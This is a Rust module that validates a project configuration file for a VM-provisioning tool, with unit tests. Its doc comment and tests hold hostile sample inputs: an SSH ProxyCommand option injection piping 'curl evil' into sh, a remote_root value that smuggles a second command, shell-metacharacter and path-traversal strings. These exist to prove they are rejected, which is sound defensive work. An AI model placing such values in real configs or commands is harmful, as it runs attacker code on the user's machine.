//! Project configuration (`bombyx.toml`).
//!
//! A bombyx project keeps its VM definition in the project
//! repo, not on the VM host: the repo is the source of
//! truth and the host holds only a cache. This module reads
//! that per-project configuration.
//!
//! Because `bombyx.toml` ships *inside a repo*, it is
//! attacker-controlled data the moment you clone or check out
//! someone else's branch. Every field is therefore validated
//! against an explicit allowlist rather than trusted -- see
//! [`Config::validate`].

use std::path::{Path, PathBuf};

use serde::Deserialize;
use thiserror::Error;

use crate::name::{ScratchName, check_segment};

/// Default directory (relative to the project root) holding
/// the Vagrantfile and provisioning scripts.
const DEFAULT_VAGRANT_DIR: &str = "vagrant";

/// Default root on the VM host under which project
/// directories are created.
const DEFAULT_REMOTE_ROOT: &str = "~/vms";

/// Errors produced while loading a project configuration.
#[derive(Debug, Error)]
pub enum ConfigError {
    /// The configuration file does not exist.
    #[error("config file not found: {}", .0.display())]
    NotFound(PathBuf),

    /// The configuration file could not be read.
    #[error("failed to read {}: {source}", .path.display())]
    Read {
        /// Path that could not be read.
        path: PathBuf,
        /// Underlying I/O error.
        source: std::io::Error,
    },

    /// The configuration file is not valid TOML, or does not
    /// match the expected shape.
    #[error("invalid config in {}: {source}", .path.display())]
    Parse {
        /// Path that failed to parse.
        path: PathBuf,
        /// Underlying TOML error.
        source: toml::de::Error,
    },

    /// A required field was present but empty.
    #[error("`{field}` must not be empty")]
    Empty {
        /// Name of the offending field.
        field: &'static str,
    },

    /// A field held a value outside its allowed shape.
    #[error("invalid `{field}`: {reason}")]
    Invalid {
        /// Name of the offending field.
        field: &'static str,
        /// What rule the value broke.
        reason: String,
    },
}

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// Characters allowed in a path on the VM host.
fn is_remote_path_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~')
}

/// A bombyx project configuration.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Config {
    /// SSH host alias of the VM host, e.g. `frosti`.
    ///
    /// Resolved through the user's `~/.ssh/config`, so
    /// bombyx never deals with addresses or usernames.
    pub host: String,

    /// Project name. Doubles as the directory name on the
    /// VM host.
    pub project: String,

    /// Directory in the project repo holding the Vagrantfile.
    #[serde(default = "default_vagrant_dir")]
    pub vagrant_dir: String,

    /// Root directory on the VM host under which project
    /// directories are created.
    #[serde(default = "default_remote_root")]
    pub remote_root: String,
}

fn default_vagrant_dir() -> String {
    DEFAULT_VAGRANT_DIR.to_owned()
}

fn default_remote_root() -> String {
    DEFAULT_REMOTE_ROOT.to_owned()
}

impl Config {
    /// Parses a configuration from TOML source.
    ///
    /// `path` is used only for error messages.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Parse`] if the source is not
    /// valid TOML or carries an unknown key, and
    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
    /// field fails validation.
    pub fn parse(source: &str, path: &Path) -> Result<Self, ConfigError> {
        let cfg: Self =
            toml::from_str(source).map_err(|source| ConfigError::Parse {
                path: path.to_path_buf(),
                source,
            })?;
        cfg.validate()?;
        Ok(cfg)
    }

    /// Loads a configuration from a file.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::NotFound`] if the file is
    /// absent, [`ConfigError::Read`] if it cannot be read,
    /// or any error from [`Config::parse`].
    pub fn load(path: &Path) -> Result<Self, ConfigError> {
        // Read first and classify the error afterwards: an
        // `exists()` pre-check is a race, and it reports
        // "not found" for a file that exists but cannot be
        // opened.
        let source = std::fs::read_to_string(path).map_err(|source| {
            if source.kind() == std::io::ErrorKind::NotFound {
                ConfigError::NotFound(path.to_path_buf())
            } else {
                ConfigError::Read {
                    path: path.to_path_buf(),
                    source,
                }
            }
        })?;
        Self::parse(&source, path)
    }

    /// Rejects values that are empty or outside their allowed
    /// shape.
    ///
    /// The `host` rules are the load-bearing ones. `host` is
    /// passed as the first positional argument to `ssh` and
    /// `scp`, and neither program honours a `--`
    /// end-of-options separator. A value starting with `-` is
    /// therefore read as an *option*, so a repo shipping
    /// `host = "-oProxyCommand=curl evil|sh"` would run code
    /// on this workstation from a bare `bombyx status` --
    /// before any network traffic. Restricting the charset
    /// closes that.
    fn validate(&self) -> Result<(), ConfigError> {
        for (field, value) in [
            ("host", &self.host),
            ("project", &self.project),
            ("vagrant_dir", &self.vagrant_dir),
            ("remote_root", &self.remote_root),
        ] {
            if value.trim().is_empty() {
                return Err(ConfigError::Empty { field });
            }
            if value.starts_with('-') {
                return Err(ConfigError::Invalid {
                    field,
                    reason: "must not start with `-`, which \
                             ssh and scp read as an option"
                        .to_owned(),
                });
            }
        }

        charset(
            "host",
            &self.host,
            is_host_char,
            "letters, \
            digits, `.`, `_`, `-` or `@`",
        )?;

        // `project` becomes one directory name on the host.
        check_segment(&self.project).map_err(|e| ConfigError::Invalid {
            field: "project",
            reason: e.to_string(),
        })?;

        charset(
            "remote_root",
            &self.remote_root,
            is_remote_path_char,
            "letters, digits, `.`, `_`, `-`, `/` or `~`",
        )?;
        // A `~` is only expanded by the remote shell in
        // leading position; anywhere else it is a literal
        // character and almost certainly a mistake.
        if self
            .remote_root
            .char_indices()
            .any(|(i, c)| c == '~' && i > 0)
        {
            return Err(ConfigError::Invalid {
                field: "remote_root",
                reason: "`~` is only allowed as the first \
                         character"
                    .to_owned(),
            });
        }

        // `vagrant_dir` is a local path, so it must tolerate
        // Windows spellings (`infra\vm`, `C:\...`). Only
        // control characters are refused.
        if self.vagrant_dir.chars().any(char::is_control) {
            return Err(ConfigError::Invalid {
                field: "vagrant_dir",
                reason: "must not contain control characters".to_owned(),
            });
        }

        Ok(())
    }

    /// Returns the project directory on the VM host, e.g.
    /// `~/vms/phren`.
    ///
    /// A trailing slash on `remote_root` is ignored so the
    /// result never contains a doubled separator.
    #[must_use]
    pub fn remote_project_dir(&self) -> String {
        format!("{}/{}", self.root(), self.project)
    }

    /// Returns the directory on the VM host used for an
    /// ephemeral (`scratch`) VM of this project.
    ///
    /// The project name is part of the path: `scratch pr-1`
    /// in two different projects must not resolve to the same
    /// directory, or the second boot extracts one project's
    /// Vagrantfile over the other's live `.vagrant/`.
    #[must_use]
    pub fn remote_scratch_dir(&self, name: &ScratchName) -> String {
        format!("{}/scratch/{}/{name}", self.root(), self.project)
    }

    /// Returns `remote_root` without any trailing slash.
    fn root(&self) -> &str {
        self.remote_root.trim_end_matches('/')
    }
}

/// Checks every character of `value` against `allowed`.
fn charset(
    field: &'static str,
    value: &str,
    allowed: fn(char) -> bool,
    expected: &str,
) -> Result<(), ConfigError> {
    if let Some(bad) = value.chars().find(|c| !allowed(*c)) {
        return Err(ConfigError::Invalid {
            field,
            reason: format!(
                "character {bad:?} is not allowed; use only \
                 {expected}"
            ),
        });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal() -> &'static str {
        "host = \"frosti\"\nproject = \"phren\"\n"
    }

    fn parse(source: &str) -> Result<Config, ConfigError> {
        Config::parse(source, Path::new("bombyx.toml"))
    }

    fn good() -> Config {
        parse(minimal()).unwrap()
    }

    fn scratch(name: &str) -> ScratchName {
        ScratchName::parse(name).unwrap()
    }

    #[test]
    fn parses_minimal_config_and_applies_defaults() {
        let cfg = good();
        assert_eq!(cfg.host, "frosti");
        assert_eq!(cfg.project, "phren");
        assert_eq!(cfg.vagrant_dir, "vagrant");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn parses_explicit_overrides() {
        let src = "host = \"fusion\"\nproject = \"ledgerstone\"\n\
                   vagrant_dir = \"infra/vm\"\n\
                   remote_root = \"/srv/vms\"\n";
        let cfg = parse(src).unwrap();
        assert_eq!(cfg.vagrant_dir, "infra/vm");
        assert_eq!(cfg.remote_root, "/srv/vms");
    }

    #[test]
    fn accepts_a_user_at_host_destination() {
        let src = "host = \"igor@frosti.local\"\nproject = \"p\"\n";
        assert_eq!(parse(src).unwrap().host, "igor@frosti.local");
    }

    #[test]
    fn rejects_invalid_toml() {
        let err = parse("host = ").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("bombyx.toml"));
    }

    #[test]
    fn rejects_missing_required_field() {
        let err = parse("host = \"frosti\"\n").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
    }

    #[test]
    fn rejects_an_unknown_key() {
        // A typo must be reported, not silently defaulted:
        // the symptom would otherwise be a push into the
        // wrong remote directory.
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrantdir = \"infra/vm\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("vagrantdir"));
    }

    #[test]
    fn rejects_empty_host() {
        let src = "host = \"\"\nproject = \"phren\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "host" }));
    }

    #[test]
    fn rejects_whitespace_only_project() {
        let src = "host = \"frosti\"\nproject = \"  \"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "project" }));
    }

    #[test]
    fn rejects_empty_vagrant_dir() {
        let src = "host = \"f\"\nproject = \"p\"\nvagrant_dir = \"\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Empty {
                field: "vagrant_dir"
            }
        ));
    }

    #[test]
    fn rejects_empty_remote_root() {
        let src = "host = \"f\"\nproject = \"p\"\nremote_root = \"\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Empty {
                field: "remote_root"
            }
        ));
    }

    #[test]
    fn rejects_a_host_that_is_an_ssh_option() {
        // The headline case: a cloned repo must not be able
        // to run code on this workstation.
        let src = "host = \"-oProxyCommand=curl evil|sh\"\n\
                   project = \"p\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Invalid { field: "host", .. }));
        assert!(err.to_string().contains("option"));
    }

    #[test]
    fn rejects_a_host_with_shell_metacharacters() {
        for host in ["a;id", "a$(id)", "a b", "a`id`", "a/b"] {
            let src = format!("host = {host:?}\nproject = \"p\"\n");
            assert!(parse(&src).is_err(), "host {host:?} must be rejected");
        }
    }

    #[test]
    fn rejects_a_remote_root_with_shell_metacharacters() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   remote_root = \"~/vms; curl evil|sh #\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "remote_root",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_non_leading_tilde_in_remote_root() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   remote_root = \"/srv/~igor\"\n";
        let err = parse(src).unwrap_err();
        assert!(err.to_string().contains("first character"));
    }

    #[test]
    fn rejects_a_project_that_is_not_one_segment() {
        let src = "host = \"f\"\nproject = \"../../etc\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "project",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_vagrant_dir_that_looks_like_a_flag() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrant_dir = \"--exclude=x\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "vagrant_dir",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_vagrant_dir_with_control_characters() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrant_dir = \"a\\nb\"\n";
        let err = parse(src).unwrap_err();
        assert!(err.to_string().contains("control characters"));
    }

    #[test]
    fn accepts_a_windows_vagrant_dir() {
        let src = "host = \"f\"\nproject = \"p\"\n\
                   vagrant_dir = 'infra\\vm'\n";
        assert_eq!(parse(src).unwrap().vagrant_dir, r"infra\vm");
    }

    #[test]
    fn builds_remote_project_dir() {
        assert_eq!(good().remote_project_dir(), "~/vms/phren");
    }

    #[test]
    fn remote_project_dir_ignores_trailing_slash() {
        let src = "host = \"f\"\nproject = \"p\"\nremote_root = \"/srv/\"\n";
        assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
    }

    #[test]
    fn scratch_dir_is_scoped_to_the_project() {
        // Without the project segment, `scratch pr-1` from
        // two projects lands in one directory and the second
        // boot overwrites the first's `.vagrant/`.
        assert_eq!(
            good().remote_scratch_dir(&scratch("pr-1234")),
            "~/vms/scratch/phren/pr-1234"
        );
    }

    #[test]
    fn scratch_dirs_of_two_projects_do_not_collide() {
        let a = good();
        let src = "host = \"frosti\"\nproject = \"ledgerstone\"\n";
        let b = parse(src).unwrap();
        let name = scratch("pr-1");
        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
    }

    #[test]
    fn load_reports_missing_file() {
        let path = Path::new("definitely-not-here-bombyx.toml");
        let err = Config::load(path).unwrap_err();
        assert!(matches!(err, ConfigError::NotFound(_)));
        assert!(err.to_string().contains("config file not found"));
    }

    #[test]
    fn load_reads_an_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bombyx.toml");
        std::fs::write(&path, minimal()).unwrap();
        assert_eq!(Config::load(&path).unwrap().project, "phren");
    }

    #[test]
    fn load_reports_a_directory_as_a_read_error() {
        // Reading a directory fails with something other
        // than NotFound, which is the `Read` arm.
        let dir = tempfile::tempdir().unwrap();
        let err = Config::load(dir.path()).unwrap_err();
        assert!(matches!(err, ConfigError::Read { .. }));
    }
}
